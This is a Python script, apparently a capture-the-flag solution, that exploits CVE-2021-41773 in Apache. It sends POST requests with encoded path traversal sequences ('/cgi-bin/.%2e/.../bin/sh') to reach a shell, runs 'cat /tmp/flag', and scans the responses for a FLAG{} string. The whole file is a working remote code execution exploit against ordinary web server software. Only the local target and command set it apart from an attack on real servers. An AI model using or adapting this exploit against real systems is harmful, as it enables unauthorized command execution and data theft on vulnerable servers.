import socket
import re

# Target details
host = "127.0.0.1"
port = 32808

# Try multiple path traversal patterns for CVE-2021-41773
patterns = [
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/tmp/flag",
    "/icons/.%2e/.%2e/.%2e/.%2e/bin/sh",
    "/.%2e/.%2e/.%2e/.%2e/bin/sh"
]

command = "cat /tmp/flag"

for pattern in patterns:
    print(f"\n[+] Trying pattern: {pattern}")
    print(f"[+] Command: {command}")
    
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # Build HTTP POST request
        request = f"POST {pattern} HTTP/1.1\r\n"
        request += f"Host: {host}:{port}\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += f"Content-Length: {len(command)}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        request += command
        
        # Send request
        sock.sendall(request.encode())
        
        # Receive response
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        sock.close()
        
        # Decode response
        response_text = response.decode('utf-8', errors='ignore')
        
        print(f"[+] Response received ({len(response)} bytes)")
        print(f"[+] Full Response:")
        print(response_text)
        print()
        
        # Search for FLAG{} pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
        
        if flag_match:
            flag = flag_match.group(0)
            print(f"[!] FLAG FOUND: {flag}")
            break
        else:
            print("[-] No FLAG{} pattern found in this response")
    
    except Exception as e:
        print(f"[-] Error with pattern {pattern}: {type(e).__name__}: {str(e)}")
        continue

print("\n[+] Exploit attempts completed")

